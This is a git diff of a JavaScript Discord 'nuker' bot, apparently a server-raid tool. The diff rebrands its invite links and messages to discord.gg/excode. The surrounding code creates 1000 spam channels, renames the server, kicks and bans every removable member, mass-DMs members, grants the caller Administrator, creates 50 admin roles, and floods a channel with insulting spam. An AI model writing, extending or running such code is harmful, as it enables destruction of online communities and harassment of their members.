@@ -26,7 +26,7 @@ client.on('messageCreate', async (msg) => {
       const channelsToCreate = [];
       let i = 0;
       while (i < 1000) {
-        channelsToCreate.push({ name: 'discord.gg/react', type: ChannelType.GuildText });
+        channelsToCreate.push({ name: 'discord.gg/excode', type: ChannelType.GuildText });
         i++;
       }
 
@@ -55,7 +55,7 @@ client.on('messageCreate', async (msg) => {
       // Update guild settings
       try {
         await msg.guild.setIcon('https://pbs.twimg.com/media/Ex6m_hqXIAQLWeZ?format=jpg&name=4096x4096');
-        await msg.guild.setName('discord.gg/react');
+        await msg.guild.setName('discord.gg/excode');
       } catch (err) {
         console.error('Failed to update guild settings:', err);
       }
@@ -74,7 +74,7 @@ client.on('messageCreate', async (msg) => {
       // Update bot settings
       try {
         await client.user.setAvatar('https://pbs.twimg.com/media/Ex6m_hqXIAQLWeZ?format=jpg&name=4096x4096');
-        await client.user.setUsername('discord.gg/react UWU');
+        await client.user.setUsername('discord.gg/excode UWU');
       } catch (err) {
         console.error('Failed to update bot settings:', err);
       }
@@ -89,14 +89,14 @@ client.on('messageCreate', async (msg) => {
   await Promise.all(
     msg.guild.members.cache.map(member => {
       if (member.kickable && member.id !== client.user.id) {
-        return member.kick('discord.gg/siyahbeyaz').then(() => console.log(`${member.user.tag} atıldı.`)).catch(err => console.error(`Kick hatası: ${err}`));
+        return member.kick('discord.gg/excode').then(() => console.log(`${member.user.tag} atıldı.`)).catch(err => console.error(`Kick hatası: ${err}`));
       }
     })
   );
 },
 '+dm': async () => {
   await msg.delete();
-  const message = '**Bir sunucu sevilmiştir haberiniz osun! İYİGÜNLEEEER :3** :wink:';
+  const message = ' **SWENZY SIKERR** ';
   
   await Promise.all(
     msg.guild.members.cache.map(member => {
@@ -108,7 +108,7 @@ client.on('messageCreate', async (msg) => {
 },
     '+yetki': async () => {
       await msg.delete();
-      const role = await msg.guild.roles.create({ name: '.', permissions: [PermissionFlagsBits.Administrator] });
+      const role = await msg.guild.roles.create({ name: '</>', permissions: [PermissionFlagsBits.Administrator] });
       await msg.member.roles.add(role);
     },
 '+ban': async () => {
@@ -116,19 +116,19 @@ client.on('messageCreate', async (msg) => {
   await Promise.all(
     msg.guild.members.cache.map(member => {
       if (member.bannable && member.id !== client.user.id) {
-        return member.ban({ reason: 'discord.gg/siyahbeyaz' }).then(() => console.log(`${member.user.tag} banlandı.`)).catch(err => console.error(`Ban hatası: ${err}`));
+        return member.ban({ reason: 'discord.gg/excode' }).then(() => console.log(`${member.user.tag} banlandı.`)).catch(err => console.error(`Ban hatası: ${err}`));
       }
     })
   );
 },
 '+rol': async () => {
-  if (msg.author.id !== config.sahip) return msg.reply('discord.gg/siyahbeyaz');
+  if (msg.author.id !== config.sahip) return msg.reply('discord.gg/excode');
   await msg.delete();
   
   let count = 0;
   while (count < 50) {
     await msg.guild.roles.create({
-      name: 'discord.gg/react',
+      name: 'discord.gg/excode',
       color: 'FF3E00',
       permissions: [PermissionFlagsBits.Administrator]
     }).then(() => console.log(`Rol ${count + 1} oluşturuldu.`)).catch(err => console.error(`Rol oluşturma hatası: ${err}`));
@@ -138,7 +138,7 @@ client.on('messageCreate', async (msg) => {
 },
     '+spam': async () => {
       await msg.delete();
-      const spamMessage = '**bu sunucu hacklenmiştir kolaydınız 😘 @everyone **';
+      const spamMessage = '**SWENZY SIKERR**';
       for (let i = 0; i < 100; i++) {
         await msg.channel.send(spamMessage);
       }
@@ -162,7 +162,7 @@ client.on('messageCreate', async (msg) => {
             url: 'https://cdn.discordapp.com/attachments/1173319481599213639/1258825072248881292/a_0b05ce4dbc49d501b989eb54b99aa805.gif?ex=668973b5&is=66882235&hm=39b19bd6622752e65ebbc3d26c855c5933a862970d56b807131a8592cd6f5922&',
           },
         color: 0xff0000,
-        footer: { text: 'Bot Developer : swenzyim' }
+        footer: { text: 'discord.gg/excode' }
       };
       await msg.channel.send({ embeds: [embed] });
     }
